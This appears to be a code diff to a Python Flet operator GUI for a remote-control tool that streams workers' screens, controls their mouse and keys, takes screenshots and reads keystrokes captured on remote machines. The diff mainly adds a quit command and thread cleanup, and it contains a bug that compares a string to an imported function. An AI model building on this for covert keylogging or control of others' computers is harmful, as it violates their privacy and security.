@@ -4,6 +4,10 @@ from rs_master import Master
 import flet as ft
 from flet.core.types import FontWeight
 import threading
+
+from rs_worker import listen_to_keys
+
+
 def get_options(functions:list[str],type:str) -> list[DropdownOption]:
     options_list = []
     if type == "commends":
@@ -14,6 +18,7 @@ def get_options(functions:list[str],type:str) -> list[DropdownOption]:
     else:
         for function in ["press_key_in_worker","control_mouse"]:
             options_list.append(ft.DropdownOption(key=function))
+    options_list.append(ft.DropdownOption(key="quit"))
     return options_list
 
 class App:
@@ -69,9 +74,12 @@ class App:
         self.master.on_stream_stop = self.live_stream_stopped
         self.master.update_clients = self.update_clients
         self.dlg:ft.AlertDialog | None= None
-        threading.Thread(target=self.master.show_stream, daemon=True).start()
-        threading.Thread(target=self.master.control_keys,daemon=True).start()
-        threading.Thread(target=self.master.control_mouse_on_worker, daemon=True).start()
+        self.ts = threading.Thread(target=self.master.show_stream, daemon=True)
+        self.tk = threading.Thread(target=self.master.control_keys,daemon=True)
+        self.tm = threading.Thread(target=self.master.control_mouse_on_worker, daemon=True)
+        self.ts.start()
+        self.tk.start()
+        self.tm.start()
 
 
 
@@ -89,6 +97,14 @@ class App:
         self.master.control_key = self.control_keys.value
 
     def update_clients(self):
+        if not self.master.clients:
+            self.workers.value = None
+            self.commands.value = None
+            self.control_mouse.disabled = True
+            self.control_keys.disabled = True
+            self.livestream.disabled = True
+            self.commands.disabled = True
+
         self.workers.options = [ft.DropdownOption(key = key) for key in self.master.clients.keys()]
         if self.page:
             self.page.update()
@@ -193,11 +209,21 @@ class App:
         else:
             if function == "screen_shot":
                 self.save_file(self.master.run2(function,function.encode()))
-            else:
+            elif function == listen_to_keys:
                 while self.listen:
                     self.add_output(self.master.run2("listen_to_keys", "listen_to_keys".encode()).decode())
                 self.listen = True
                 self.add_output(self.master.run2("stop_listen_to_keys", b"stop_listen_to_keys").decode())
+            else:
+                self.master.run2("quit", b"quit")
+
+
+    def on_window_event(self,e):
+        if e.data == "close":
+            self.master.run2("quit",b"quit")
+            self.ts.join()
+            self.tk.join()
+            self.tm.join()
 
     def main(self,page:ft.Page):
         self.page = page
